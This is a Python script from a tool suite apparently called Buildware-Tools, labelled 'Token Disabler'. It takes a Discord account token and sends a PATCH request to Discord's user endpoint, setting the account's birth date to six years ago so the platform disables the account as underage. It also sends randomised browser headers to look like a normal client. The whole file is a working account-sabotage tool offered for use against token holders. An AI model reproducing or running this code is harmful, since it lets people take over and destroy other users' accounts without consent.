# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Plugins.Utils import *
from Plugins.Config import *

try:
    from datetime import datetime
    import requests
except Exception as e:
    MissingModule(e)

Title("Token Disabler")
Connection()

Scroll(GradientBanner(discord_banner))

try:
    token = ChoiceToken()

    print(f"{LOADING} Disabling..", reset)

    birth_date = f"{datetime.now().year - 6}-{datetime.now().month}-12"
    headers    = {
        "accept"          : "*/*",
        "accept-language" : "en-US",
        "authorization"   : token,
        "content-type"    : "application/json",
        "user-agent"      : RandomUserAgents(),
        "sec-ch-ua"       : '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "x-debug-options" : "bugReporterEnabled",
    }

    response = requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json={"date_of_birth": birth_date})

    if response.status_code == 200:
        print(f"{SUCCESS} Token disabled!", reset)
    else:
        print(f"{ERROR} Could not disable token!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)